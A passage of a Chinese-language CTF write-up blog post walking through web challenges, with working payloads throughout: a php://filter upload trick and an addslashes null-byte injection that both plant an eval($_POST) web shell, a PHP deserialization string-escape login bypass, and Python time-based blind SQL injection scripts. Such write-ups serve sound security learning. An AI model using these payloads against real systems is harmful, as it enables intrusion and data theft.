<p>不难理解他的意思，我们要post一个data，同时post一个filename，data要实现文件头检测，然后加入了一个死亡代码，直接尝试用filter的convert.base64-decode去绕过，payload:<br><code>data=GIF89aaaaaaaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg===&amp;filename=php://filter/write=convert.base64-decode/resource=upload/bf380593-7548-5811-3640-b9cc1f03c483/1.php</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668791841018-821f14f5-5e20-4b1d-963a-1faddd92952d.png#averageHue=%23caa976&clientId=u6899b55e-c84d-4&from=paste&height=843&id=ufcc526fd&name=image.png&originHeight=1054&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133443&status=done&style=none&taskId=uab9006ed-e5ab-4fee-ad0e-6653c744416&title=&width=1536" alt="image.png"><br>RCE了之后我就不想多bb了，flag在根目录</p>
<h2 id="ezrequset"><a href="#ezrequset" class="headerlink" title="ezrequset"></a>ezrequset</h2><p>你只需要简单的编写一个脚本即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792046913-54f8c7d3-e1d3-41a1-baab-dd0aba9a2260.png#averageHue=%23efddb2&clientId=u6899b55e-c84d-4&from=paste&height=92&id=u6448ae2b&name=image.png&originHeight=115&originWidth=1063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10771&status=done&style=none&taskId=u832c391a-d269-4b10-9473-dbe4ad10e53&title=&width=850.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792055603-2ef24fa4-d2d5-4d7d-a5a1-22947a415126.png#averageHue=%23f5f5f4&clientId=u6899b55e-c84d-4&from=paste&height=102&id=uc5e1ef4c&name=image.png&originHeight=127&originWidth=909&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9671&status=done&style=none&taskId=u5f6444e1-a8ea-4e8f-8621-6d68ad7f5b1&title=&width=727.2" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792068844-071eaa08-0ce6-4b5d-8f46-21830eb7a1c6.png#averageHue=%23e9cb9c&clientId=u6899b55e-c84d-4&from=paste&height=117&id=u3b2db938&name=image.png&originHeight=146&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12827&status=done&style=none&taskId=u78402bf8-40b0-4e82-9459-4123bbf9ec7&title=&width=828" alt="image.png"><br>一看就知道是要用脚本光速抢课：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1=<span class="string">&quot;http://e69f96c6-6765-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://e69f96c6-6765-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=check&quot;</span></span><br><span class="line"></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&quot;xh&quot;</span>:<span class="string">&#x27;211&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&quot;num&quot;</span>:<span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;class&quot;</span>:<span class="string">&quot;台球&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r1=requests.post(url=url1,data=data1)</span><br><span class="line">    cookies=r1.cookies</span><br><span class="line">    r2=requests.post(url=url2,data=data2,cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(r2.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;抢到了!&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">        <span class="built_in">print</span>(r2.headers)</span><br><span class="line">        <span class="built_in">print</span>(r2.cookies)</span><br><span class="line">        <span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792182095-e3ec7a36-8956-4745-b4a1-8ea033668e9d.png#averageHue=%23302f2f&clientId=u6899b55e-c84d-4&from=paste&height=80&id=u3bb54f40&name=image.png&originHeight=100&originWidth=1820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29826&status=done&style=none&taskId=u443d4187-5cc8-4989-9274-f2edd68d982&title=&width=1456" alt="image.png"></p>
<h2 id="Loginintomyheart"><a href="#Loginintomyheart" class="headerlink" title="Loginintomyheart"></a>Loginintomyheart</h2><p>这题总体还是需要点信息收集和反序列化的基础<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792258144-63e617a7-027f-4829-9ba6-338a21f8c61b.png#averageHue=%23d8b580&clientId=u6899b55e-c84d-4&from=paste&height=143&id=u61f015ae&name=image.png&originHeight=179&originWidth=700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13754&status=done&style=none&taskId=u9547e8c6-76e7-4132-a1a7-c32706a1073&title=&width=560" alt="image.png"><br>不管你怎么登陆都是失败，只有知道用户Vanzy的密码才可以：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792271887-61b55a1b-9b0f-4a67-8182-9457459d455b.png#averageHue=%23f8f8f8&clientId=u6899b55e-c84d-4&from=paste&height=115&id=u21294c15&name=image.png&originHeight=144&originWidth=784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4783&status=done&style=none&taskId=u87e7ae29-b1a2-4129-96ad-987b977073f&title=&width=627.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792322999-1a817aa5-812f-4a11-b818-424d154cc748.png#averageHue=%23e5bb75&clientId=u6899b55e-c84d-4&from=paste&height=93&id=udb8df3ae&name=image.png&originHeight=116&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25975&status=done&style=none&taskId=uce8bb213-7a52-479e-a9f1-2631837e9c8&title=&width=1536" alt="image.png"><br><code>O:3:&quot;Log&quot;:3:&#123;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:7:&quot;islogin&quot;;i:0;&#125;</code><br>我们前面用的是admin&#x2F;admin，可是用户名被替换成了hacker,hacker六个字母，admin五个字母，然后islogin是判断是否登录的，不用想肯定是反序列化字符逃逸，让islogin变成1，利用admin和hacker的字差构造payload：<br><code>O:3:&quot;Log&quot;:3:&#123;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:8:&quot;username&quot;;s:26:&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;&quot;;s:7:&quot;islogin&quot;;i:0;&#125;</code><br>上面的东西是我们理想的预计要构造的payload,从s:26开始构造，<code>admin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;</code>是26个字母，但是输入之后实际长度就是admin，然后替换为hacker之后就多一个长度，中间差了21长度，所以要输入21个admin来弥补：<br><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;</code><br>这就是我们最终的payload：<br>输入到username里<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792957749-a791844c-da5a-4741-a7fd-70acba72cb51.png#averageHue=%23f3f0ed&clientId=u6899b55e-c84d-4&from=paste&height=138&id=u4bd4b86f&name=image.png&originHeight=172&originWidth=1385&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33556&status=done&style=none&taskId=u79b25cc6-158c-44f7-9de7-29143421b31&title=&width=1108" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668792983771-473e3b62-0816-4afa-90a9-b5dd23246c03.png#averageHue=%2320201f&clientId=u6899b55e-c84d-4&from=paste&height=102&id=uc1f7f7fc&name=image.png&originHeight=128&originWidth=523&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6086&status=done&style=none&taskId=u14de2b60-a352-4f8b-9474-f2625dc3c0c&title=&width=418.4" alt="image.png"><br>嗯</p>
<h2 id="uploadrce"><a href="#uploadrce" class="headerlink" title="uploadrce"></a>uploadrce</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793135735-ad5944c2-8b62-49d1-a29d-bf5f0ecb499c.png#averageHue=%23fcfcfc&clientId=u6899b55e-c84d-4&from=paste&height=199&id=u8e5a4a90&name=image.png&originHeight=249&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11463&status=done&style=none&taskId=ue6fb95b4-9529-478a-8e5b-5f65490bf90&title=&width=772" alt="image.png"><br>找一下swp文件，找了一下发现是<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793367926-84c9d956-50f6-4ca7-8575-614ac77fad4e.png#averageHue=%231a1a1a&clientId=u6899b55e-c84d-4&from=paste&height=198&id=ua87c982d&name=image.png&originHeight=248&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26414&status=done&style=none&taskId=u6ba5e5a0-35fb-453c-87dd-1b7526bbb65&title=&width=697.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793364044-2c9597e1-d784-4294-b73d-390ad47b2d61.png#averageHue=%231f1e1e&clientId=u6899b55e-c84d-4&from=paste&height=134&id=u285cfb37&name=image.png&originHeight=168&originWidth=609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6034&status=done&style=none&taskId=u56538724-551b-4afb-9ed8-8880333191f&title=&width=487.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793387498-d07f758d-01fa-40d3-94e9-dc4184a782d0.png#averageHue=%23120f0f&clientId=u6899b55e-c84d-4&from=paste&height=199&id=u2210348d&name=image.png&originHeight=249&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17913&status=done&style=none&taskId=u92aafc23-3a83-4213-a950-82c77d1b43d&title=&width=700" alt="image.png"><br>第一个是config.php的备份，第二个是index的<br>如何查看swp文件呢，这就用一下linux的<code>vim -r file</code>命令，自动修复<br>可以发现这里是有一个addslahes函数去转义的，我们可以在本地runrun试一试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793626054-77863db8-062b-48fd-82bd-9fa361c3fe1a.png#averageHue=%23f3f2f2&clientId=u6899b55e-c84d-4&from=paste&height=354&id=u483052a8&name=image.png&originHeight=442&originWidth=1109&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36578&status=done&style=none&taskId=uaf6b96b6-cdc8-4690-b67d-83d1e738477&title=&width=887.2" alt="image.png"><br>假如如上payload会发生什么事情呢？首先<code>a%00</code>会被addslashes函数转义为<code>a\0</code>,而这个\0又有讲究了，这个东西说的是第一次被匹配到的东西,也就是原本的<code>$option=&#39;a&#39;</code>,所以最后的结果如上,然后这边溢出的字符就是a了，也就是这个a就是我们的注入点：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793736970-e8296fe7-695d-46eb-bf06-afc11650a9f9.png#averageHue=%23fafadc&clientId=u6899b55e-c84d-4&from=paste&height=94&id=ubc1ad387&name=image.png&originHeight=117&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8346&status=done&style=none&taskId=ua8b79150-bc7a-4103-81e7-703d496f629&title=&width=621.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668793741073-971a2f21-3d23-45bf-879f-783180762eed.png#averageHue=%23f5f4f4&clientId=u6899b55e-c84d-4&from=paste&height=191&id=u0ccdea8a&name=image.png&originHeight=239&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16459&status=done&style=none&taskId=u2bf1c0a5-0922-40a9-aa2c-48fae777df4&title=&width=723.2" alt="image.png"><br>从这边可以看出我们的一句话木马是已经写上去了的，这就是我们的payload了：（上面的知识测试不是payload)<br><code>;eval($_POST[1]);?&gt;%00</code>，运行两次，第一次是让他变成option的值，第二次让他溢出：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794247575-9805a0c1-139b-4aa4-8ab0-7c33242bd1bc.png#averageHue=%23caa874&clientId=u6899b55e-c84d-4&from=paste&height=678&id=ucb89e641&name=image.png&originHeight=848&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100158&status=done&style=none&taskId=ub246445c-94b3-46c2-a53e-6f703bc916e&title=&width=1120.8" alt="image.png"><br>成功rce：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794265166-1f2467a2-608c-4790-85b6-4baf77e4cb36.png#averageHue=%23959494&clientId=u6899b55e-c84d-4&from=paste&height=653&id=u98c59617&name=image.png&originHeight=816&originWidth=1223&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46399&status=done&style=none&taskId=u4bb96a30-0d04-40b5-a01f-3531aa497fd&title=&width=978.4" alt="image.png"></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794341157-0e049b89-1429-4005-b3c9-e6e38c41b193.png#averageHue=%23f6f5f4&clientId=u6899b55e-c84d-4&from=paste&height=575&id=ub41a180f&name=image.png&originHeight=719&originWidth=1463&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20906&status=done&style=none&taskId=u4bfe58cb-0dd7-4b63-8079-4b9aa422525&title=&width=1170.4" alt="image.png">题目提示看robots：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794354451-1c6da45b-85cf-4a48-ab63-90368a140973.png#averageHue=%23f4f4f4&clientId=u6899b55e-c84d-4&from=paste&height=58&id=u08c555ad&name=image.png&originHeight=73&originWidth=251&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1112&status=done&style=none&taskId=u55afdc03-0705-479e-94e0-97b65edb0c0&title=&width=200.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794366261-b4060efc-cde8-4024-b86a-49f985c7cb99.png#averageHue=%23f7a046&clientId=u6899b55e-c84d-4&from=paste&height=96&id=u550dd93b&name=image.png&originHeight=120&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10800&status=done&style=none&taskId=uc752a42e-4490-4d7b-bfd5-e60fac24e74&title=&width=926.4" alt="image.png"><br>看到了select语句</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AUthor:@Boogipop</span></span><br><span class="line"><span class="comment">#van2y0secret0qaq</span></span><br><span class="line"><span class="comment"># print(&#x27;VAN2Y0SECRET0QAQ&#x27;.lower())</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://uc9dd651-5fd5-11ed-ac9d-5aa08d24e2a5.challenge.sycsec.com/login.php&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(j)!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span>(j)!=<span class="string">&#x27;$&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span>(j)!=<span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">            data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;vanzy&quot;</span>,</span><br><span class="line">            <span class="string">&quot;secretpass&quot;</span>:<span class="string">f&quot;1&#x27;or/**/if(mid((select/**/secretpass/**/from/**/vanzy_secret),1,<span class="subst">&#123;i&#125;</span>)/**/like/**/&#x27;<span class="subst">&#123;result+<span class="built_in">chr</span>(j)&#125;</span>&#x27;,sleep(1),1)#&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(data[&quot;secretpass&quot;])</span></span><br><span class="line">            t1=time.time()</span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            t2=time.time()</span><br><span class="line">            <span class="built_in">print</span>(t2-t1)</span><br><span class="line">            <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">                result+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>结果测试发现就是一个有一丢丢过滤的sql注入，不太难，写个脚本就出来了，但是我这边跑的全是大写，所以会有些bug，我也不知道为什么他大小不敏感，最后转成小写字母就是<code>van2y0secret0qaq</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794479767-58c39be2-38df-4bab-a9f3-0b81b50ad34e.png#averageHue=%23fbfcde&clientId=u6899b55e-c84d-4&from=paste&height=106&id=u1acb1dc6&name=image.png&originHeight=132&originWidth=1064&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14922&status=done&style=none&taskId=ufd21c885-3a15-4979-98ad-5848bc91333&title=&width=851.2" alt="image.png"></p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>这道题就是我的噩梦啊，我以为我会写<br>考点时Postgresql注入，语法啥的自己搜搜就会了<br><code>1 union select null,null,null --</code>发现有回显，就说明是PSQL注入了，你可以通过这个结合网上的资料，注出很多东西，最后你也会发现他说flag在root目录下<br>也就是现在如何去读取root目录是个问题，我卡在这一步没出来！</p>
<h2 id="noobsql"><a href="#noobsql" class="headerlink" title="noobsql"></a>noobsql</h2><p>这题也没出来，他这题我知道注入点在哪儿：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url1=<span class="string">&quot;http://e6851b0f-668a-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=reg&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://e6851b0f-668a-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=login&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;a&#x27;or elt(mid((select group_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;i&#125;</span>,2)&gt;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>&#x27;,sleep(0.003))#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data1[<span class="string">&quot;username&quot;</span>],data1[<span class="string">&quot;password&quot;</span>])</span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;a&#x27;or elt(mid((select group_concat(schema_name) from information_schema.schemata),<span class="subst">&#123;i&#125;</span>,2)&gt;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>&#x27;,sleep(0.003))#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r1=requests.post(url=url1,data=data1)</span><br><span class="line">        <span class="comment"># print(r1.text)</span></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r2 = requests.post(url=url2, data=data2)</span><br><span class="line">        <span class="comment"># print(r2.text)</span></span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(head)</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>脚本就是这样，有长度限制，所以很掐手，但是你注出的东西是下面的一坨屎：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794629359-a7f54d7a-6f1b-49dc-a2fc-a21d6b6dab53.png#averageHue=%23333230&clientId=u6899b55e-c84d-4&from=paste&height=175&id=u2e513b7b&name=image.png&originHeight=219&originWidth=938&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36755&status=done&style=none&taskId=u82abc8ea-5ad0-4504-ba80-7b0e86f53ff&title=&width=750.4" alt="image.png"><br>第一个ctfchinfo是当前表，第二个是列名，第三个是group_concat(schema_name)的值，你觉得有规律吗，一点hint也没，无语！</p>
<h2 id="rceus"><a href="#rceus" class="headerlink" title="rceus"></a>rceus</h2><p>我一眼就知道又是考什么新的rce：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668794712989-2828302d-76e2-4483-a0e2-b628a2bc7eb9.png#averageHue=%23fdfdfd&clientId=u6899b55e-c84d-4&from=paste&height=138&id=ue13d290f&name=image.png&originHeight=173&originWidth=1076&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7822&status=done&style=none&taskId=u6a555f0b-6972-4c6b-acdf-09b9f902ed1&title=&width=860.8" alt="image.png"><br>代码就这么一点，你怎么去bypass呢？<br>猜测和断言有关？有毒</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/UNCTF2022-WP/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">UNCTF2022-WP</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/CTFSHOW-%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CTFSHOW-菜狗杯</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>